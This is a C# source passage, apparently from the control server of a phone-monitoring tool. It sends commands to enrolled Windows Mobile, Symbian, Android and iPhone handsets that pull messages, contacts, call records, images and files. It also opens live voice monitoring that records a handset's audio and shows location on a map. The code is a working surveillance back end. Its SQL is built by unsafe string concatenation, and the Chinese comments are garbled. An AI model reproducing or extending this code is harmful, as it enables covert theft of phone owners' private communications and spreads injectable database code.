                connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
                connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
                OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
                conn.Open();
                // string sql = "insert into client (PhoneNum,PhoneID,SendTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + SendTime + "','" +Flag + "')";
                OleDbCommand cmd = new OleDbCommand(sql, conn);
                cmd.ExecuteNonQuery();
                //cmd.Dispose();
                conn.Close();
            }
            catch (System.Data.OleDb.OleDbException)
            {
            }
        }
        // string sql = "insert into client (PhoneNum,PhoneID,SendTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + SendTime + "','" + Flag + "')";
        // string sql = "insert into Command (PhoneNum,Content,ComTime,Flag) values('" + PhoneNum + "','" + Content + "','" + ComTime + "','" + Flag + "')";
        // string sql = "insert into ALLCommand (PhoneNum,Content,ComTime,Flag) values('" + PhoneNum + "','" + Content + "','" + ComTime + "','" + Flag + "')"            

        //���� ִ��������
        private void updata1()
        {
            dataGridView2.Enabled = false;
            string sql = "select * from Command";
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            OleDbDataAdapter da = new OleDbDataAdapter(sql, conn);           
            da.Fill(dt);         

            this.dataGridView2.DataSource = dt;
            conn.Close();
            //GridColumnStylesCollection myDataGridColStyle = this.dataGridView2.TableStyles[0].GridColumnStyles; 
            dataGridView2.Enabled = true;
            //dataGridView2.a

        }

        //���� ȫ������
        private void updata2()
        {
            string sql = "select * from ALLCommand";
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            OleDbDataAdapter da = new OleDbDataAdapter(sql, conn);            
            da.Fill(dt);         
            this.dataGridView2.DataSource = dt;
            conn.Close();
        }

        private void delete(string sql)
        {
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();

            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            datareader.Close();
            conn.Close();
        }

        private void ShowTreeInfo()
        {                    
            if (treeView1.Nodes[0].IsSelected == true)      
               updata2();           
            else
                if (treeView1.Nodes[2].IsSelected == true)                
                    updata1();
                else if (treeView1.Nodes[1].IsSelected == true)
                    tabControl1.SelectedTab = tabPage3;
        }
      
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            ShowTreeInfo();
        }
        //��ȡ������Ϣ�����������Command��
        public string SelectBefore =null; //����һ��ȫ�ֱ�������ˢ��ǰѡ�еĿͻ�����Ϣ

        private void GetInfo()
        {
            while (true)
            {
                if (treeView1.Nodes[0].IsSelected || treeView1.Nodes[1].IsSelected || treeView1.Nodes[2].IsSelected)
                    break;
                else
                {
                    if (treeView2.SelectedNode != null)
                    {
                        if (treeView2.SelectedNode.ImageIndex == 17)
                        {
                            MessageBox.Show("�ͻ���δ���ߣ��ݲ��ɼ���");
                            break;
                        }
                    }
                    else
                    {
                        MessageBox.Show("��ѡ������Ŀͻ���");
                        break;
                    }

                }

                SelectBefore = treeView2.SelectedNode.Text;
                string[] info = treeView2.SelectedNode.Text.Split(' ');
               
                string PhoneNum = info[0];
                string PhoneID = info[1];
                string OS = info[2];              

                string Content = null;
                string ComTime = System.DateTime.Now.ToString();
                string Flag = "Doing";
                //Mobileϵͳ֧�ֵ�����
              if(OS.CompareTo("Mobile")==0)
              {
                if (treeView1.Nodes[3].Nodes[0].IsSelected == true)
                    Content = "FileInfor";
                else if (treeView1.Nodes[3].Nodes[1].IsSelected == true)
                    Content = "Message";
                else if (treeView1.Nodes[3].Nodes[2].IsSelected == true)
                    Content = "SimPhoneNum";
                else if (treeView1.Nodes[3].Nodes[3].IsSelected == true)
                    Content = "OutLookPhoneNum";
                else if (treeView1.Nodes[3].Nodes[4].IsSelected == true)
                    Content = "Appointment";                 
                else if (treeView1.Nodes[3].Nodes[5].IsSelected == true)
                    Content = "Task";
                else if (treeView1.Nodes[3].Nodes[8].IsSelected == true)
                    Content = "CallRecord";
                else if (treeView1.Nodes[3].Nodes[10].IsSelected == true)
                    Content = "Image";
                else if (treeView1.Nodes[3].Nodes[7].IsSelected == true)
                {
                    Content = "Stop";
                   /* if (iface != null)
                        iface.BeClose();*/
                }
                else if (treeView1.Nodes[3].Nodes[6].IsSelected == true)
                {
                    if (!Only())
                    {
                        Content = "Voice";
                        //MessageBox.Show(Content);
                        //iface = new Interface();                           //Windows Mobile����������  
                        //iface.Ini(FileNow);
                        //Ini(FileNow);             //0704
                    }
                    else
                        MessageBox.Show("ֻ�ɼ���һ���ն�");
                }
                else if (treeView1.Nodes[3].Nodes[9].IsSelected == true )
                {
                    ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                    set.Show();                  

                }
                //start - 20111109
                /*
                else if (treeView1.Nodes[3].Nodes[11].IsSelected == true) {
                    Content = "ColorMsg";
                }
                else if (treeView1.Nodes[3].Nodes[12].IsSelected == true) {
                    Content = "EMail";
                }
                 */
                //end - 20111109
                else
                    MessageBox.Show("���ֻ�ϵͳ�ݲ�֧�ָ�����");
               
               }

                //Symbianϵͳ֧�ֵ�����
              if (OS.CompareTo("Symbian") == 0)
              {
                 
                  if (treeView1.Nodes[3].Nodes[1].IsSelected == true)
                      Content = "Message";
                  else if (treeView1.Nodes[3].Nodes[2].IsSelected == true)
                      Content = "SimPhoneNum";
                  else if (treeView1.Nodes[3].Nodes[3].IsSelected == true)
                      Content = "OutLookPhoneNum";                 
                  else if (treeView1.Nodes[3].Nodes[8].IsSelected == true)
                      Content = "CallRecord";
                  else if (treeView1.Nodes[3].Nodes[10].IsSelected == true)
                      Content = "Image";
                  else if (treeView1.Nodes[3].Nodes[7].IsSelected == true)
                  {
                      Content = "Stop";                   
                  }
                  else if (treeView1.Nodes[3].Nodes[6].IsSelected == true)
                  {
                      if (!Only())
                      {
                          Content = "Voice";

                      }
                      else
                          MessageBox.Show("ֻ�ɼ���һ���ն�");
                  }
                  //start - 20111109
                  /*
                  else if (treeView1.Nodes[3].Nodes[11].IsSelected == true) {
                      Content = "ColorMsg";
                  }
                  else if (treeView1.Nodes[3].Nodes[12].IsSelected == true) {
                      Content = "EMail";
                  }*/
                  //end - 20111109
                  else
                      MessageBox.Show("���ֻ�ϵͳ�ݲ�֧�ָ�����");
               
              }

              if (OS.CompareTo("Android") == 0)
              {
                  if (treeView1.Nodes[3].Nodes[0].IsSelected == true)
                      Content = "FileInfor";
                  else if (treeView1.Nodes[3].Nodes[1].IsSelected == true)
                      Content = "Message";
                  else if (treeView1.Nodes[3].Nodes[2].IsSelected == true)
                      Content = "SimPhoneNum";
                  else if (treeView1.Nodes[3].Nodes[3].IsSelected == true)
                      Content = "OutLookPhoneNum";
                  else if (treeView1.Nodes[3].Nodes[4].IsSelected == true)
                      Content = "Appointment";              
                  else if (treeView1.Nodes[3].Nodes[8].IsSelected == true)
                      Content = "CallRecord";
                  //20111220 android���๦���ݲ���ʹ��
                  /*else if (treeView1.Nodes[3].Nodes[10].IsSelected == true)
                      Content = "Image";
                  */else if (treeView1.Nodes[3].Nodes[7].IsSelected == true)
                  {
                      Content = "Stop";                     
                  }
                  else if (treeView1.Nodes[3].Nodes[6].IsSelected == true)
                  {
                      if (!Only())
                      {
                          Content = "Voice";

                      }
                      else
                          MessageBox.Show("ֻ�ɼ���һ���ն�");
                  }
                  else if (treeView1.Nodes[3].Nodes[9].IsSelected == true)
                  {
                      ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                      set.Show();


                  }
                  //start - 20111109
                  else if (treeView1.Nodes[3].Nodes[11].IsSelected == true) {
                      Content = "ColorMsg";
                  }
                  /*
                  else if (treeView1.Nodes[3].Nodes[12].IsSelected == true) {
                      Content = "EMail";
                  }*/
                  //end - 20111109
                  else
                      MessageBox.Show("���ֻ�ϵͳ�ݲ�֧�ָ�����");

              } else if(OS.CompareTo("IPhone") == 0){
                  if (treeView1.Nodes[3].Nodes[0].IsSelected == true)
                      Content = "FileInfor";
                  else if (treeView1.Nodes[3].Nodes[1].IsSelected == true)
                      Content = "Message";
                  else if (treeView1.Nodes[3].Nodes[2].IsSelected == true)
                      Content = "SimPhoneNum";
                  else if (treeView1.Nodes[3].Nodes[3].IsSelected == true)
                      Content = "OutLookPhoneNum";
                  else if (treeView1.Nodes[3].Nodes[4].IsSelected == true)
                      Content = "Appointment";
                  else if (treeView1.Nodes[3].Nodes[8].IsSelected == true)
                      Content = "CallRecord";
                  else if (treeView1.Nodes[3].Nodes[10].IsSelected == true)
                      Content = "Image";
                  else if (treeView1.Nodes[3].Nodes[7].IsSelected == true) {
                      Content = "Stop";
                  }
                  else if (treeView1.Nodes[3].Nodes[6].IsSelected == true) {
                      if (!Only()) {
                          Content = "Voice";

                      }
                      else
                          MessageBox.Show("ֻ�ɼ���һ���ն�");
                  }
                  else if (treeView1.Nodes[3].Nodes[9].IsSelected == true) {
                      ADDuser set = new ADDuser(PhoneNum, PhoneID, ComTime, Flag);
                      set.Show();


                  } else
                      MessageBox.Show("���ֻ�ϵͳ�ݲ�֧�ָ�����");
              }
              
                if (Content != null)
                {
                    string sql = "insert into Command(PhoneIMSI,PhoneID,Content,ComTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + Content + "','" + ComTime + "','" + Flag + "')";
                    string sql1 = "insert into ALLCommand(PhoneIMSI,PhoneID,Content,ComTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + Content + "','" + ComTime + "','" + Flag + "')";
                    
                    IntoDatabase1(PhoneNum, PhoneID, Content, ComTime, Flag, sql);//�������񵽡�ִ���С��б���
                    IntoDatabase1(PhoneNum, PhoneID, Content, ComTime, Flag, sql1);//�������񵽡�ȫ�������б���                  
                    updata1();                  
                }

                break;
            }
        }
        private void treeView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

            GetInfo();
        }



        #region
       
        int i = 0;
        #region  ȡ����
        private bool Only()
        {
            string[] CommandDo = new string[100];
            string Content;
            int i = 0;
            bool have = false;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";  //��ȡӦ�ó�����ǰ·�� debug����·��
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Command ";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            while (datareader.Read())
            {

                Content = datareader["Content"].ToString();
                if (Content.CompareTo("Voice") == 0)
                {
                    have = true;
                    break;
                }


            }
            conn.Close();

            return have;


        }
        #endregion
        private string[] GetCommand(string PhoneID, string PhoneNum_1, string OS)
        {
            string[] CommandDo = new string[100];
            string PhoneNum, Content;
            int i = 0;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();

            //������һ������״̬
            string state = "select * from client where PhoneID = '" + PhoneID + "' and PhoneNum = '" + PhoneNum_1 + "'";
            OleDbCommand myCmd_1 = new OleDbCommand(state, conn);
            OleDbDataReader datareader_1 = myCmd_1.ExecuteReader();

            while (datareader_1.Read()) {
                string LastOrderTime = datareader_1["LastOrderTime"].ToString();
                string Finished = datareader_1["Finished"].ToString();

                bool send = false;
                //�������������ǵ�һ��
                if ((Finished.CompareTo("1")==0) || (Finished.CompareTo("")==0)) {
                    send = true;
                }

                //��ǰ�л�û�н���,�ж��Ƿ񳬹�һ����
                if (Finished.CompareTo("0") == 0) {
                    if (LastOrderTime.CompareTo("") == 0) {
                        send = true;
                    } else {
                        //����Ƿ���� ���������� ����ΪOff
                        System.DateTime date3 = Convert.ToDateTime(LastOrderTime);
                        System.DateTime ComTime = System.DateTime.Now;
                        System.TimeSpan diff2 = ComTime - date3;
                        //30��
                        if (diff2.TotalSeconds > 30) {
                            send = true;
                        }
                    }
                } 
                if (send) {
                    //���Ƿ�������
                    string sql = "select * from Command  where PhoneID = '" + PhoneID + "'";
                    OleDbCommand myCmd = new OleDbCommand(sql, conn);
                    OleDbDataReader datareader = myCmd.ExecuteReader();
                    while (datareader.Read()) {
                        // i++;
                        PhoneNum = datareader["PhoneIMSI"].ToString();
                        Content = datareader["Content"].ToString();
                        //string task = PhoneNum + "@" + Content;
                        //MessageBox.Show(task);
                        CommandDo[i++] = Content;
                        deleteCommand(PhoneID, Content);

                        //����Client
                        string now = System.DateTime.Now.ToString();
                        string update = "update Client set Finished ='" + "0" + "', LastOrderTime = '" + now + "'where  PhoneID = '" + PhoneID + "'and PhoneNum='" + PhoneNum_1 + "'";
                        OleDbCommand upp = new OleDbCommand(update, conn);
                        upp.ExecuteNonQuery();
                        break;
                    }
                }
                break;
            }
            conn.Close();
            return CommandDo;
        }

        #endregion
        private void deleteCommand(string PhoneID, string content)
        {
            string sql = "delete from Command where PhoneID=" + "'" + PhoneID + "'and Content=" + "'" + content + "'";        
            delete(sql);          
        }

        # endregion                 
        
        #region Symbian�����Ĳ���
        string MyFileName = AppDomain.CurrentDomain.BaseDirectory + "1.amr";
        string MyFileName2 = AppDomain.CurrentDomain.BaseDirectory + "2.amr";
        string MyFileName11 = AppDomain.CurrentDomain.BaseDirectory + "1.wav";
        string MyFileName21 = AppDomain.CurrentDomain.BaseDirectory + "2.wav";
        string MyFileTest = AppDomain.CurrentDomain.BaseDirectory + "test.amr";
        Thread TempThreadS; //Symbian���������ļ��߳�
        Thread playVoice;//���������ļ��߳�
       
     
        int sign = 1;//�����ļ���־λ
        int play = 0;//�����ļ���־λ
        int i1, j = 0;     
      
        FileStream fs1;
        BinaryWriter wb1;
        FileStream fs2;
        BinaryWriter wb2;
    
        IPEndPoint RemoteIPEndPoint = new IPEndPoint(IPAddress.Any, 0);//Զ�̷��ͽڵ�    
        MusicPlayer music = new MusicPlayer();   //0220
        public int temp = 0;//0220   
        private void yuyinS()
        {       
            TempThreadS = new Thread(new ThreadStart(this.ReceiveFile1));//���������ļ��߳�
            TempThreadS.IsBackground = true;
            TempThreadS.Start();
            playVoice = new Thread(new ThreadStart(this.playvoice1));//���������ļ��߳�
            playVoice.IsBackground = true;
            playVoice.Start();      
        }
        private void StopyuyinS()
        {
            try
            {
                if (TempThreadS.IsAlive)
                {
                    //TempThreadS.Sleep(1);
                    TempThreadS.Join();
                }             
                if (playVoice.IsAlive)
                {
                  //   playVoice.Sleep(1);
                     playVoice.Join();
                }
            }
            catch (Exception e)
            {
                MessageBox.Show("ֹͣS����" + e.ToString());
            }
        }
     
   
        public void ReceiveFile1()  
        {
          
             while(true)
             {
                Socket symbiany = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                symbiany.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 20 * 1000);
                IPEndPoint sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("2008"));
                Byte[] send = Encoding.ASCII.GetBytes("MonVoice");
                try
                {              

                  while (true)
                  {
                       send = Encoding.ASCII.GetBytes("MonVoice");
                      try
                      {
                          if (symbiany.Connected)
                          {
                              break;
                          }
                          else
                          {
                              symbiany.Connect(sever);
                              break;
                          }
                      }
                      catch
                      {

                      }
                  }

                  TransferFiles.SendVarData(symbiany, send); 
                         
                  subYuyinS(symbiany);  

              }
              catch//(Exception e)
              {
                  if (symbiany != null)
                      symbiany.Close();
                  //MessageBox.Show("S��������" + e.ToString());
              }
             }
        }

              

    public void subYuyinS(Socket symbiany)
    {
        //while (true)
        //{           
        //try
        //    {
                while (true)
                {
                    Byte[] receiveBytes = TransferFiles.ReceiveVarData(symbiany);
                    //  symbiany.Receive(receiveBytes, receiveBytes.Length, 0);
                    //MessageBox.Show("1");
                    if (receiveBytes.Length == 0)
                        break;
                    //MessageBox.Show("2");
                    toolStripStatusLabel1.Text = "Symbian��������";
                    if (FileNow == null)
                        break;
                    //MessageBox.Show("3");
                    RecordS(receiveBytes);//������¼����                  
                    //MessageBox.Show("4");
                    if (sign == 1)  //��1.amr�������ļ�
                    {
                        if (File.Exists(MyFileName11))
                            File.Delete(MyFileName11);

                        if (!File.Exists(MyFileName))
                            CreatFileHead(MyFileName);
                        FileInfo f1 = new FileInfo(MyFileName);
                        i1 = Int32.Parse(f1.Length.ToString());
                        //  if (i1 < 5 * 1024)
                        if (i1 < 14 * 1024)
                        {

                            fs1 = new FileStream(MyFileName, FileMode.Append);
                            wb1 = new BinaryWriter(fs1);
                            wb1.Write(receiveBytes);
                            wb1.Close();
                            fs1.Close();

                        }
                        else
                        {
                            sign = 2;  //���ձ�־Ϊ2����2.amr������
                            play = 1;//���ű�־Ϊ1 ���������Բ���1.amr

                            if (!File.Exists(MyFileName2))
                                CreatFileHead(MyFileName2);
                            FileInfo f2 = new FileInfo(MyFileName2);
                            j = Int32.Parse(f2.Length.ToString());

                            fs2 = new FileStream(MyFileName2, FileMode.Append);
                            wb2 = new BinaryWriter(fs2);
                            wb2.Write(receiveBytes);
                            wb2.Close();
                            fs2.Close();


                        }
                    }
                    else
                    {
                        if (sign == 2)//��2.amr�������ļ�
                        {
                            if (File.Exists(MyFileName21))
                                File.Delete(MyFileName21);

                            if (!File.Exists(MyFileName2))
                                CreatFileHead(MyFileName2);
                            FileInfo f2 = new FileInfo(MyFileName2);
                            j = Int32.Parse(f2.Length.ToString());
                            //   if (j < 5 * 1024)
                            if (j < 14 * 1024)
                            {
                                fs2 = new FileStream(MyFileName2, FileMode.Append);
                                wb2 = new BinaryWriter(fs2);
                                wb2.Write(receiveBytes);
                                wb2.Close();
                                fs2.Close();

                            }

                            else
                            {
                                sign = 1;
                                play = 2;

                                if (File.Exists(MyFileName11))
                                    File.Delete(MyFileName11);

                                if (!File.Exists(MyFileName))
                                    CreatFileHead(MyFileName);
                                FileInfo f1 = new FileInfo(MyFileName);
                                i1 = Int32.Parse(f1.Length.ToString());

                                fs1 = new FileStream(MyFileName, FileMode.Append);
                                wb1 = new BinaryWriter(fs1);
                                wb1.Write(receiveBytes);
                                wb1.Close();
                                fs1.Close();

                            }
                        }
                    }
                }
               
            //}
        //    catch 
        //    {
               
        //    }
        //}
}
        public void playvoice1() //20110108ԭʼ����
        {
            
            while (true)
           {                
                try
                {
                   Thread.Sleep(1000);
                   if(play==1)
                    {                  
                        
                        string path = AppDomain.CurrentDomain.BaseDirectory + "test1.exe";
                        System.Diagnostics.Process.Start(path);
                        string pathPlay = AppDomain.CurrentDomain.BaseDirectory + "WAVPlayer.exe"; 
                        Thread.Sleep(3000);                       
                        Process newProc = System.Diagnostics.Process.Start(pathPlay, MyFileName11);  
                        play = 0;                  
                        newProc.WaitForExit();                  
                    }
                  if (play==2)
                    {            

                        string path = AppDomain.CurrentDomain.BaseDirectory + "test.exe";
                        System.Diagnostics.Process.Start(path);          
                        Thread.Sleep(3000);                        
                        Process newProc1 = System.Diagnostics.Process.Start("WAVPlayer.exe", MyFileName21);
                        play = 0;
                        newProc1.WaitForExit();                        
                    }
                }
                catch(Exception  e)
                {
                    MessageBox.Show(e.ToString());
                }
           }
        }

        //¼������ĺ���
        public void FileVoiceCreate(string PhoneID, string PhoneNum,string OS)
        {
            //��Debug\ReceviceFile\Voice�н���һ���Ե�ǰ�����������ļ���
           // string RTime = System.DateTime.Now.ToShortDateString();
            string RTime = System.DateTime.Now.ToString("yyyy-MM-dd");
            string fileSub = "Voice\\" + RTime;
            string path = FileCreateSub(fileSub);

            //�ļ����� ʱ���ȡ   �ļ���ʽ 34567890@1342222222@2011-2-16 20;59;08.amr
            //string TimeFull = System.DateTime.Now.ToString();
            string TimeFull = System.DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss");
            string Name = TimeFull.Replace(':', ';');

            //�����ļ�����Ԥ��д��ͷ�ļ�
            if (OS.CompareTo("Symbian") == 0)
            {
                string RecordFileName = PhoneNum + "@" + PhoneID + "@" + Name + ".amr";
                string fileFullName = path + "\\" + RecordFileName;
                FileNow = fileFullName;
                CreatFileHead(FileNow);
            }
            else if (OS.CompareTo("Mobile") == 0)
            {
                string RecordFileName = PhoneNum + "@" + PhoneID + "@" + Name + ".wav";
                string fileFullName = path + "\\" + RecordFileName;
                FileNow = fileFullName;            
            }
            else if (OS.CompareTo("Android") == 0)
            {
                //string RecordFileName = PhoneNum + "@" + PhoneID + "@" + Name + ".wav";
                string RecordFileName = Name + ".wav";
                string fileFullName = path + "\\" + RecordFileName;
                FileNow = fileFullName;             
            }

        }
        public void RecordS(Byte[] receiveBytes)
        {
            FileStream fs = new FileStream(FileNow, FileMode.Append);
            BinaryWriter wb = new BinaryWriter(fs);
            wb.Write(receiveBytes);
            wb.Close();
            fs.Close();
        }

        public void CreatFileHead(string MyFileName)  //����һ���ļ�����Ԥ��д��AMR�Ķ����Ƶ�ͷ
        {

            byte[] KAMRNBHeader ={ 0x23, 0x21, 0x41, 0x4d, 0x52, 0x0a };

            FileStream fs = new FileStream(MyFileName, FileMode.Create);
            BinaryWriter bw = new BinaryWriter(fs);
            bw.Write(KAMRNBHeader);
            bw.Close();
            fs.Close();
        }

       

        #endregion

        #region  Mobile��������
        Thread TempThreadM; //Mobile���������ļ��߳�
        private void yuyinM()
        {
           TempThreadM = new Thread(new ThreadStart(this.ReceiveFileM));//���������ļ��߳�
           TempThreadM.IsBackground = true;
           TempThreadM.Start();
        }
        public void ReceiveFileM()
        {
            while (true)
            {
                Socket mobiley = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                mobiley.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 20 * 1000);
                IPEndPoint sever = new IPEndPoint(IPAddress.Parse(getP2PIPAddress()), int.Parse("10002"));
                Byte[] send = Encoding.ASCII.GetBytes("MonVoice");
                try
                {


                    while (true)
                    {
                        send = Encoding.ASCII.GetBytes("MonVoice");
                        try
                        {
                            if (mobiley.Connected)
                            {
                                break;
                            }
                            else
                            {
                                mobiley.Connect(sever);
                            }
                        }
                        catch
                        {

                        }
                    }
                    TransferFiles.SendVarData(mobiley, send);
                    subYuyinM(mobiley);

                }
                catch
                {
                    if (mobiley != null)
                        mobiley.Close();
                }

            }
        }



        public void subYuyinM(Socket mobiley)
        {

            try
            {
                while (true)
                {
                    Byte[] receive = TransferFiles.ReceiveVarData(mobiley);
                    string sTemp1 = Encoding.ASCII.GetString(receive);
                    if (receive.Length == 0)
                        break;



                    toolStripStatusLabel1.Text = "Mobile��������";
                    iface.PlayBuffer(sTemp1,sTemp1.Length);
                }
               
                
            }
            catch(Exception e)
            {
                MessageBox.Show("Mobile����" + e.ToString());
               
            }

        }

        private void test(ref sbyte[] name,int len)
        {

            sbyte[] testsbyte = new sbyte[len];
            for (int i = 0; i < len; i++)
            {
                testsbyte[i] = name[i];
            }
        }
        private void StopyuyinM()
        {
            try
            {
                if (TempThreadM != null)
                TempThreadM.Abort();
            }
            catch(Exception e)
            {
                MessageBox.Show("ֹͣM����" + e.ToString());
            }
        }

       
        public void CreatFileHeadM(string MyFileName)  //����һ���ļ�����Ԥ��д��MAV�Ķ����Ƶ�ͷ
        {

            byte[] KAMRNBHeader = { 0x23, 0x21, 0x41, 0x4d, 0x52, 0x0a };

            FileStream fs = new FileStream(MyFileName, FileMode.Create);
            BinaryWriter bw = new BinaryWriter(fs);
            bw.Write(KAMRNBHeader);
            bw.Close();
            fs.Close();
        }

        #endregion
      
        Thread ThreadTrany;
        Thread sendMy;


        public void login() //���ƶ����ߣ�֪ͨ������
        {
            try {
                sendMy = new Thread(new ThreadStart(loginT));
                sendMy.IsBackground = true;
                sendMy.Start();
            } catch {
                //�쳣����
            }
            

            
        }
        private void TOrder()  //����ķ���
        {
            ThreadTrany = new Thread(new ThreadStart(Order));
            ThreadTrany.IsBackground = true;
            ThreadTrany.Start();
            if (this.IsDisposed)
                return;
        }

        public string FileCreateSub(string file)
        {
            //����ÿ���ֻ���Ӧ���ļ���
            string path = AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile\\" + file;
            if (Directory.Exists(AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile\\" + file))
            {
                //  MessageBox.Show("directory exists");  //C#�����ļ���  
            }
            else
            {
                Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile\\" + file);
                // MessageBox.Show("done");
            }
            return path;

        }
        public void ClientOnline(string PhoneNum, string PhoneID,string OS)
        {
            string PhoneNumO, PhoneIDO, TimeO, FlagO,OSO;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Client ";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            string ComTime = System.DateTime.Now.ToString();
            string Flag = "On";
            bool hv = false;
            while (datareader.Read())
            {

                PhoneNumO = datareader["PhoneNum"].ToString();
                PhoneIDO = datareader["PhoneID"].ToString();
                TimeO = datareader["SendTime"].ToString();
                FlagO = datareader["Flag"].ToString();
                OSO = datareader["OS"].ToString();
                string sqlT = "update Client set Flag ='" + "On" + "', SendTime = '" + ComTime + "',OS='" + OS + "'where  PhoneID = '" + PhoneIDO + "'and PhoneNum='" + PhoneNumO + "'";
                if (PhoneNumO.CompareTo(PhoneNum) == 0 && PhoneIDO.CompareTo(PhoneID) == 0 && OSO.CompareTo(OS) == 0)
                {
                    //OleDbCommand myCmd1 = new OleDbCommand(sqlT, conn);
                    //myCmd1.ExecuteNonQuery();
                    hv = true;

                }

            }
            conn.Close();

            if (hv == false)  //û�м�¼ʱ
            {

                string sqlI = "insert into client (PhoneNum,PhoneID,SendTime,Flag,OS) values('" + PhoneNum + "','" + PhoneID + "','" + ComTime + "','" + Flag + "','" + OS + "')";
                IntoDatabase1(PhoneNum, PhoneID, ComTime, Flag,OS, sqlI);
                clientTree = true; //�������¿ͻ����б�
                //GetTree();
            }

        }

        //webBrowser����WEBҳ��
        private void loadingPage()
        {
            String urlPath = Path.GetFullPath(System.AppDomain.CurrentDomain.BaseDirectory + "BaiduMap/BDMap.htm").Replace(Path.DirectorySeparatorChar, '/'); ;
            urlPath = "file:\\" + urlPath;
            //MessageBox.Show(urlPath);
            LocMap.Navigate(urlPath);
        }



        private void timer2_Tick(object sender, EventArgs e)
        {
            if (clientTree)
            {
                GetTreeTest();
                clientTree = false;
            }
        }

        #region �����ĵ��������״�ṹ
        private void jiazai()
        {

            //�õ������ļ���Ŀ¼
            string ReceviceFile = AppDomain.CurrentDomain.BaseDirectory + "ReceviceFile";
            
            MyNode mn = new MyNode(ReceviceFile, true);
            this.treeView9.Nodes.Clear();//0222
            this.listView4.Clear();//0222
            this.treeView9.Nodes.Add(mn);


            this.listView4.Columns.Add("����", (this.listView4.Width / 5)*2, HorizontalAlignment.Center);
            this.listView4.Columns.Add("��С", (this.listView4.Width / 10), HorizontalAlignment.Center);
            this.listView4.Columns.Add("����", this.listView4.Width / 10, HorizontalAlignment.Center);
            this.listView4.Columns.Add("�޸�ʱ��", this.listView4.Width / 5, HorizontalAlignment.Center);
            this.listView4.Columns.Add("����λ��", this.listView4.Width / 5, HorizontalAlignment.Center);
            this.listView4.View = View.Details;
        }   

       

        private void treeView9_AfterSelect(object sender, TreeViewEventArgs e)
        {
            try
            {
                this.listView4.Items.Clear();

                MyNode mn = (MyNode)e.Node;
                if (mn.isLoadFiles == false && mn.Nodes.Count == 0)               
                {
                    DirectoryInfo di = new DirectoryInfo(mn.MyPath);
                    this.listView4.Items.Clear();             

                    foreach (DirectoryInfo d in di.GetDirectories())//���Ϊ�ļ���
                    {
                        mn.Nodes.Add(new MyNode(d.FullName, false));
                        ListViewItem lvi = this.listView4.Items.Add(d.Name);
                        lvi.SubItems.Add("");
                        lvi.SubItems.Add("�ļ���");
                        lvi.SubItems.Add(d.LastAccessTime.ToString());
                        lvi.SubItems.Add(d.FullName);                        
                        lvi.ImageIndex = 18;//����ͼ��

                    }
                    foreach (FileInfo f in di.GetFiles())//���Ϊ�ļ�
                    {

                        ListViewItem lvi = this.listView4.Items.Add(f.Name, 0);//�����ļ�����ͼ��

                        float temp2 = 0;
                        string t;
                        float TotalSize = (float)f.Length;
                        float temp1 = TotalSize / 1024;
                     

                        if (temp1 > 1024)
                        {
